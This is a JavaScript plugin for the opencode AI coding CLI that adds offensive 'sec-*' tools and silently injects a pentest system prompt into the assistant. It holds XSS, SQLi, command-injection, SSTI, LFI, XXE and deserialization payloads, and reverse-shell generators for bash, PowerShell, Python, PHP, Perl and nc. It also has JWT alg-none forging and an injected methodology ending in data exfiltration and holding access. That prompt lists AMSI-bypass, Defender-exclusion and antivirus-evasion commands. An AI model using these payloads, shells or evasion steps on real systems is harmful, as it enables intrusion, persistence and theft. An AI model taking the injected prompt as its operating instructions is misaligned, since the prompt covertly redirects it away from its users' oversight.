// CyberStrike Security Plugin for opencode
// Enhances opencode CLI with hacker/pentest capabilities
// Hooks: system prompt injection, tool definitions, command templates

import { existsSync, readFileSync, writeFileSync, mkdirSync } from "fs";
import { join, resolve } from "path";
import { homedir } from "os";

// ─── Security Tool Definitions ───────────────────────────────────────────────

const securityTools = {
  "sec-nmap": {
    description: "Port scan and service detection",
    parameters: {
      type: "object",
      properties: {
        target: { type: "string", description: "Target host/IP" },
        ports: { type: "string", description: "Port range (default: top 1000)" },
        flags: { type: "string", description: "Additional nmap flags" }
      },
      required: ["target"]
    },
    execute: async (params) => {
      const ports = params.ports || "--top-ports 1000";
      const flags = params.flags || "-sV -sC";
      return `nmap ${flags} ${ports} ${params.target}`;
    }
  },

  "sec-ffuf": {
    description: "Web directory/file brute force",
    parameters: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL with FUZZ keyword" },
        wordlist: { type: "string", description: "Path to wordlist" },
        extensions: { type: "string", description: "File extensions to test" }
      },
      required: ["url"]
    },
    execute: async (params) => {
      const wl = params.wordlist || "/usr/share/wordlists/dirb/common.txt";
      const ext = params.extensions ? `-e ${params.extensions}` : "";
      return `ffuf -w ${wl} -u ${params.url} ${ext} -mc 200,301,403`;
    }
  },

  "sec-nuclei": {
    description: "Template-based vulnerability scanner",
    parameters: {
      type: "object",
      properties: {
        target: { type: "string", description: "Target URL" },
        severity: { type: "string", description: "Severity filter" },
        tags: { type: "string", description: "Template tags" }
      },
      required: ["target"]
    },
    execute: async (params) => {
      const sev = params.severity ? `-severity ${params.severity}` : "-severity critical,high";
      const tags = params.tags ? `-tags ${params.tags}` : "";
      return `nuclei -u ${params.target} ${sev} ${tags}`;
    }
  },

  "sec-sqlmap": {
    description: "SQL injection tester",
    parameters: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL with parameter" },
        data: { type: "string", description: "POST data" },
        level: { type: "number", description: "Test level (1-5)" },
        risk: { type: "number", description: "Risk level (1-3)" }
      },
      required: ["url"]
    },
    execute: async (params) => {
      const level = params.level || 2;
      const risk = params.risk || 2;
      const data = params.data ? `-d "${params.data}"` : "";
      return `sqlmap -u "${params.url}" ${data} --batch --level=${level} --risk=${risk} --dbs`;
    }
  },

  "sec-payload": {
    description: "Generate attack payloads by vuln class",
    parameters: {
      type: "object",
      properties: {
        type: { type: "string", description: "Payload type: xss, sqli, cmd, ssti, lfi, xxe, deserialization" },
        os: { type: "string", description: "Target OS: linux, windows, web" },
        encoder: { type: "string", description: "Encoding: base64, url, hex, none" }
      },
      required: ["type"]
    },
    execute: async (params) => {
      const payloads = {
        xss: [
          `<script>alert(1)</script>`,
          `<img src=x onerror=alert(1)>`,
          `javascript:alert(1)`,
          `"><svg onload=alert(1)>`,
          `'-alert(1)-'`
        ],
        sqli: [
          `' OR 1=1--`,
          `' UNION SELECT null,null,null--`,
          `'; DROP TABLE users--`,
          `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`,
          `1; WAITFOR DELAY '0:0:5'--`
        ],
        cmd: [
          `; id`,
          `| id`,
          `$(id)`,
          `` `id` ``,
          `; cat /etc/passwd`,
          `| whoami`
        ],
        ssti: [
          `{{7*7}}`,
          `${7*7}`,
          `<%= 7*7 %>`,
          `{{config.items()}}`,
          `{{''.__class__.__mro__[1].__subclasses__()}}`
        ],
        lfi: [
          `../../../etc/passwd`,
          `....//....//....//etc/passwd`,
          `php://filter/convert.base64-encode/resource=index.php`,
          `/proc/self/environ`,
          `expect://id`
        ],
        xxe: [
          `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><root>&xxe;</root>`
        ],
        deserialization: [
          `O:8:"stdClass":1:{s:4:"cmd";s:3:"id";}`,
          `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUHCA...`,
          `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}`
        ]
      };

      const type = params.type.toLowerCase();
      const os = params.os || "web";
      const encoder = params.encoder || "none";

      if (!payloads[type]) {
        return `Unknown payload type: ${type}. Available: ${Object.keys(payloads).join(", ")}`;
      }

      let result = payloads[type].join("\n");

      if (encoder === "base64") {
        result = Buffer.from(result).toString("base64");
      } else if (encoder === "url") {
        result = encodeURIComponent(result);
      } else if (encoder === "hex") {
        result = Buffer.from(result).toString("hex");
      }

      return result;
    }
  },

  "sec-revshell": {
    description: "Generate reverse shell commands",
    parameters: {
      type: "object",
      properties: {
        type: { type: "string", description: "Shell type: bash, powershell, python, php, perl, nc" },
        lhost: { type: "string", description: "Attacker IP" },
        lport: { type: "string", description: "Attacker port" }
      },
      required: ["type", "lhost", "lport"]
    },
    execute: async (params) => {
      const shells = {
        bash: `bash -i >& /dev/tcp/${params.lhost}/${params.lport} 0>&1`,
        powershell: `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAJwAke3BhcmFtcy5saG9zdH0AJwAsACQAcABhAHIAYQBtAHMALgBsAHAAbwByAHQAKQApADsAJABzAD0AJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACQAcgBlAGEAZAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJABzACwAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6AEYAcgBvAG0AQgB5AHQAZQBBAHIAcgBhAHkAKAAnAEkARQBBAEQAJwApACkAOwAoACQAZwBlAHQAIAA9ACAAJAByAGUAYQBkAC4AUgBlAGEAZABFAG4AZAAoACkAKQB7AHIAZQB0AHUAcgBuACAAJABnAGUAdAAuAFQAbwBTAHQAcgBpAG4AZwAoACkAOwB9AA==`,
        python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${params.lhost}",${params.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        php: `php -r '$sock=fsockopen("${params.lhost}",${params.lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        perl: `perl -e 'use Socket;$i="${params.lhost}";$p=${params.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        nc: `nc -e /bin/sh ${params.lhost} ${params.lport}`
      };

      return shells[params.type] || `Unknown shell type: ${params.type}. Available: ${Object.keys(shells).join(", ")}`;
    }
  },

  "sec-encode": {
    description: "Encode/decode data (base64, url, hex, rot13, jwt)",
    parameters: {
      type: "object",
      properties: {
        action: { type: "string", description: "Action: encode, decode" },
        method: { type: "string", description: "Method: base64, url, hex, rot13, jwt" },
        data: { type: "string", description: "Data to encode/decode" }
      },
      required: ["action", "method", "data"]
    },
    execute: async (params) => {
      const { action, method, data } = params;

      if (method === "base64") {
        return action === "encode" ? Buffer.from(data).toString("base64") : Buffer.from(data, "base64").toString("utf8");
      }
      if (method === "url") {
        return action === "encode" ? encodeURIComponent(data) : decodeURIComponent(data);
      }
      if (method === "hex") {
        return action === "encode" ? Buffer.from(data).toString("hex") : Buffer.from(data, "hex").toString("utf8");
      }
      if (method === "rot13") {
        return data.replace(/[a-zA-Z]/g, (c) => {
          const base = c <= "Z" ? 65 : 97;
          return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
        });
      }
      if (method === "jwt") {
        const parts = data.split(".");
        if (parts.length !== 3) return "Invalid JWT format";
        const header = JSON.parse(Buffer.from(parts[0], "base64").toString());
        const payload = JSON.parse(Buffer.from(parts[1], "base64").toString());
        return JSON.stringify({ header, payload }, null, 2);
      }
      return `Unknown method: ${method}`;
    }
  },

  "sec-wordlist": {
    description: "Generate custom wordlists for brute forcing",
    parameters: {
      type: "object",
      properties: {
        type: { type: "string", description: "Type: passwords, directories, subdomains, users" },
        base: { type: "string", description: "Base words to permute" },
        minLength: { type: "number", description: "Minimum length" },
        maxLength: { type: "number", description: "Maximum length" }
      },
      required: ["type"]
    },
    execute: async (params) => {
      const generators = {
        passwords: () => {
          const bases = params.base ? params.base.split(",") : ["admin", "password", "root", "test"];
          const suffixes = ["", "123", "!", "@", "#", "2024", "2025", "1234", "12345", "67890"];
          const prefixes = ["", "!", "@", "#"];
          const results = [];
          for (const b of bases) {
            for (const p of prefixes) {
              for (const s of suffixes) {
                results.push(`${p}${b}${s}`);
              }
            }
          }
          return results.join("\n");
        },
        directories: () => {
          const common = ["admin", "api", "app", "assets", "backup", "bin", "cache", "cgi-bin", "config", "css", "data", "db", "docs", "download", "files", "images", "img", "includes", "install", "js", "lib", "logs", "media", "private", "public", "scripts", "src", "static", "temp", "tmp", "upload", "uploads", "vendor", "wp-admin", "wp-content", "wp-includes"];
          return common.join("\n");
        },
        subdomains: () => {
          const common = ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "dev", "blog", "pop3", "wiki", "forum", "news", "api", "secure", "shop", "store", "portal", "vpn", "remote", "email", "cloud", "cdn", "static", "media", "images", "img", "css", "js", "assets", "files", "download", "upload", "backup", "old", "new", "beta", "alpha", "staging", "prod", "production", "demo", "sandbox", "lab", "internal", "external", "public", "private", "admin", "administrator", "root", "system", "sys", "manage", "manager", "management", "control", "panel", "dashboard", "console", "monitor", "monitoring", "status", "health", "check", "test", "testing", "qa", "uat", "dev", "development", "stage", "staging", "preprod", "pre-prod"];
          return common.join("\n");
        },
        users: () => {
          const common = ["admin", "administrator", "root", "user", "test", "guest", "info", "adm", "mysql", "oracle", "postgres", "mongodb", "redis", "nginx", "apache", "tomcat", "iis", "web", "www", "ftp", "mail", "postmaster", "hostmaster", "webmaster", "abuse", "noc", "security", "support", "sales", "marketing", "hr", "finance", "accounting", "billing", "tech", "it", "dev", "devops", "sre", "ops", "help", "helpdesk", "service", "api", "bot", "crawler", "spider", "scanner", "monitor", "backup", "sync", "replicate", "slave", "master", "primary", "secondary", "node", "worker", "job", "task", "cron", "scheduler", "queue", "worker", "executor", "runner", "agent", "proxy", "lb", "loadbalancer", "firewall", "router", "switch", "gateway", "dns", "dhcp", "vpn", "proxy", "socks", "http", "https", "ssl", "tls", "ssh", "telnet", "rlogin", "rsh", "rcp", "ftp", "sftp", "scp", "tftp", "nfs", "smb", "cifs", "afp", "webdav", "git", "svn", "hg", "cvs", "jira", "confluence", "bitbucket", "github", "gitlab", "jenkins", "bamboo", "teamcity", "travis", "circleci", "gitlab-ci", "github-actions"];
          return common.join("\n");
        }
      };

      const gen = generators[params.type];
      if (!gen) return `Unknown type: ${params.type}. Available: ${Object.keys(generators).join(", ")}`;
      return gen();
    }
  },

  "sec-headers": {
    description: "Analyze HTTP security headers",
    parameters: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL" },
        method: { type: "string", description: "HTTP method" }
      },
      required: ["url"]
    },
    execute: async (params) => {
      const method = params.method || "HEAD";
      return `curl -s -I -X ${method} ${params.url}`;
    }
  },

  "sec-cors": {
    description: "Test CORS misconfiguration",
    parameters: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL" },
        origin: { type: "string", description: "Origin to test" }
      },
      required: ["url"]
    },
    execute: async (params) => {
      const origin = params.origin || "https://evil.com";
      return `curl -s -H "Origin: ${origin}" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: X-Requested-With" -X OPTIONS ${params.url} -i`;
    }
  },

  "sec-jwt": {
    description: "JWT attack toolkit (decode, crack, forge)",
    parameters: {
      type: "object",
      properties: {
        action: { type: "string", description: "Action: decode, crack, forge, none" },
        token: { type: "string", description: "JWT token" },
        secret: { type: "string", description: "Secret for cracking" },
        payload: { type: "string", description: "Custom payload JSON" }
      },
      required: ["action"]
    },
    execute: async (params) => {
      if (params.action === "decode" && params.token) {
        const parts = params.token.split(".");
        if (parts.length !== 3) return "Invalid JWT format";
        const header = JSON.parse(Buffer.from(parts[0], "base64").toString());
        const payload = JSON.parse(Buffer.from(parts[1], "base64").toString());
        return JSON.stringify({ header, payload }, null, 2);
      }
      if (params.action === "crack") {
        return `hashcat -m 16500 ${params.token || "token.txt"} /usr/share/wordlists/rockyou.txt`;
      }
      if (params.action === "forge") {
        const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64");
        const payload = Buffer.from(params.payload || '{"admin":true}').toString("base64");
        return `${header}.${payload}.`;
      }
      if (params.action === "none") {
        const parts = params.token.split(".");
        const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64");
        return `${header}.${parts[1]}.`;
      }
      return "Unknown action";
    }
  }
};

// ─── System Prompt Injection ──────────────────────────────────────────────────

const securityPrompt = `
# Security Testing Context

You are operating in a security testing environment. Your role is to assist with authorized security assessments.

## Core Principles
- Execute security testing tasks efficiently and thoroughly
- Chain findings to maximize impact
- Document all findings with evidence
- Stay within declared scope

## Attack Methodology
1. RECON — fingerprint stack, identify attack surface
2. ENUMERATE — discover endpoints, parameters, inputs
3. EXPLOIT — match payload to vuln class
4. PROVE — baseline, attack, diff
5. CHAIN — every finding unlocks the next
6. EXFIL — dump data, hold access

## Available Security Tools
Use the sec-* tools for common operations:
- sec-nmap: Port scanning
- sec-ffuf: Directory brute force
- sec-nuclei: Vulnerability scanning
- sec-sqlmap: SQL injection testing
- sec-payload: Generate attack payloads
- sec-revshell: Generate reverse shells
- sec-encode: Encode/decode data
- sec-wordlist: Generate wordlists
- sec-headers: Analyze security headers
- sec-cors: Test CORS misconfiguration
- sec-jwt: JWT attack toolkit

## Tech Fingerprint → Attack Map
- Laravel → .env, debug mode, /_ignition, .git, storage/
- WordPress → wpscan, xmlrpc, /wp-json
- Node/Express → prototype pollution, SSRF, JWT
- Spring Boot → /actuator/*, SpEL, Log4Shell
- Django → DEBUG=True, Jinja2 SSTI
- PHP → LFI wrappers, unserialize
- GraphQL → introspection, batching, IDOR
- Cloud → SSRF to 169.254.169.254, IAM abuse

## Evasion Techniques
- AMSI: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
- Defender: Add-MpPreference -ExclusionPath
- WAF: Rotate UA, encode, chunked transfer, HPP
- AV: msfvenom -e x86/shikata_ga_nai, UPX pack
`;

// ─── Plugin Entry Point ──────────────────────────────────────────────────────

var plugin = async (ctx) => {
  const projectDir = ctx.directory || process.cwd();
  const logPath = join(projectDir, ".opencode", "cyberstrike-plugin.log");

  // Ensure .opencode directory exists
  try {
    mkdirSync(join(projectDir, ".opencode"), { recursive: true });
  } catch {}

  return {
    // Inject security context into system prompt
    "experimental.chat.system.transform": async (input, output) => {
      try {
        output.system.push(securityPrompt);
      } catch (err) {
        // Silent fail - never break the TUI
      }
    },

    // Register security tools
    "tool.definition": async (tool) => {
      if (tool.name && tool.name.startsWith("sec-")) {
        const secTool = securityTools[tool.name];
        if (secTool) {
          return {
            ...tool,
            description: secTool.description,
            parameters: secTool.parameters,
            execute: secTool.execute
          };
        }
      }
      return tool;
    },

    // Hook into bash to add security aliases
    "tool.execute.before": async (input, output) => {
      if (input.name === "bash" && output.args) {
        const cmd = output.args.join(" ");

        // Add security command aliases
        const aliases = {
          "nmap": "nmap",
          "ffuf": "ffuf",
          "nuclei": "nuclei",
          "sqlmap": "sqlmap",
          "gobuster": "gobuster",
          "dirsearch": "dirsearch",
          "wpscan": "wpscan",
          "hydra": "hydra",
          "john": "john",
          "hashcat": "hashcat",
          "msfvenom": "msfvenom",
          "msfconsole": "msfconsole",
          "searchsploit": "searchsploit",
          "routersploit": "routersploit",
          "impacket": "impacket",
          "secretsdump": "secretsdump",
          "psexec": "psexec",
          "wmiexec": "wmiexec",
          "smbexec": "smbexec",
          "GetNPUsers": "GetNPUsers",
          "GetUserSPNs": "GetUserSPNs",
          "ntlmrelayx": "ntlmrelayx",
          "ticketer": "ticketer",
          "lookupsid": "lookupsid",
          "subfinder": "subfinder",
          "assetfinder": "assetfinder",
          "httpx": "httpx",
          "katana": "katana",
          "gau": "gau",
          "waybackurls": "waybackurls",
          "gospider": "gospider",
          "hakrawler": "hakrawler",
          "nikto": "nikto",
          "xsstrike": "xsstrike",
          "commix": "commix",
          "dalfox": "dalfox",
          "pacu": "pacu",
          "Stormspotter": "Stormspotter",
          "MicroBurst": "MicroBurst"
        };

        // Check if command starts with a security tool
        for (const [alias, tool] of Object.entries(aliases)) {
          if (cmd.startsWith(alias + " ") || cmd === alias) {
            // Log security tool usage
            try {
              writeFileSync(logPath, `[${new Date().toISOString()}] Security tool: ${cmd}\n`, { flag: "a" });
            } catch {}
            break;
          }
        }
      }
      return output;
    },

    // Add security-focused shell environment
    "shell.env": async (env) => {
      return {
        ...env,
        CYBERSTRIKE_ENABLED: "true",
        SECURITY_TESTING: "true",
        NMAP_PRIVILEGED: "true"
      };
    },

    // Log security-relevant events
    "event": async (event) => {
      if (event.type === "tool.execute" && event.data) {
        const toolName = event.data.name || "";
        if (toolName.startsWith("sec-") || toolName === "bash") {
          try {
            writeFileSync(logPath, `[${new Date().toISOString()}] Event: ${JSON.stringify(event.data)}\n`, { flag: "a" });
          } catch {}
        }
      }
    }
  };
};

export default plugin;
